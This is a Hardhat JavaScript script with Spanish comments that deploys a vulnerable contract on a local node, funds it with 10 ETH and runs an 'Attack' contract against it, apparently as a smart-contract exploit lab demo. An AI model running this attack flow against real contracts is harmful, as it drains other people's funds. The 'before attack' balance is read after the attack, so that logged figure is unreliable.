// 1️⃣ Importamos Hardhat
const { ethers } = require("hardhat");

// 2️⃣ Función principal autoejecutable
async function main() {
    // 3️⃣ Obtenemos las cuentas del nodo Hardhat
    const [deployer, attacker] = await ethers.getSigners();
    console.log(`✅ Deployer: ${deployer.address}`);
    console.log(`✅ Attacker: ${attacker.address}`);

    // 4️⃣ Desplegamos el contrato vulnerable
    const VulnerableContract = await ethers.getContractFactory("VulnerableContract");
    const vulnerable = await VulnerableContract.deploy();
    await vulnerable.waitForDeployment();
    console.log(`📌 Contrato vulnerable desplegado en: ${await vulnerable.getAddress()}`);

    // 5️⃣ Hacemos un depósito inicial en el contrato vulnerable
    let tx = await vulnerable.connect(deployer).deposit({ value: ethers.parseEther("10") });
    await tx.wait();
    console.log(`✅ Se depositaron 10 ETH en el contrato vulnerable`);

    // 6️⃣ Desplegamos el contrato atacante, pasándole la dirección del contrato vulnerable
    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.connect(attacker).deploy(await vulnerable.getAddress());
    await attack.waitForDeployment();
    console.log(`📌 Contrato atacante desplegado en: ${await attack.getAddress()}`);

    // 7️⃣ Verificamos el balance inicial del atacante
    let attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`🔹 Balance inicial del atacante: ${ethers.formatEther(attackerBalance)} ETH`);

    // 8️⃣ Ejecutamos el ataque enviando 1 ETH al contrato atacante
    tx = await attack.connect(attacker).attack({ value: ethers.parseEther("1") });
    await tx.wait();
    console.log(`🚨 ¡Ataque ejecutado! 🚨`);

    let balanceAntes = await ethers.provider.getBalance(vulnerable.target);
    console.log("💰 Balance del contrato vulnerable antes del ataque:", ethers.formatEther(balanceAntes));

    let balanceDespues = await ethers.provider.getBalance(vulnerable.target);
    console.log("💀 Balance del contrato vulnerable después del ataque:", ethers.formatEther(balanceDespues));


    // 9️⃣ Verificamos el balance final del atacante
    attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`🔹 Balance final del atacante: ${ethers.formatEther(attackerBalance)} ETH`);
}

//  🔟 Ejecutamos la función main y capturamos errores
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
